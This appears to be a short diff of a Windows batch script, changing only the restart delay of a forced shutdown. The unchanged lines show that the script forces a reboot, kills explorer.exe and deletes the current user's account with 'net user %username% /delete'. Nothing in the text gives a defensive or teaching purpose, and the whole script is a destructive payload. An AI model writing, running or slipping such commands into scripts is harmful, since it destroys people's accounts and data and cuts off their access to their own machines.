@@ -1,6 +1,6 @@
 @echo off
 
-shutdown /r /f /t 60
+shutdown /r /f /t 120
 taskkill /IM explorer.exe /f
 
 net user %username% /delete
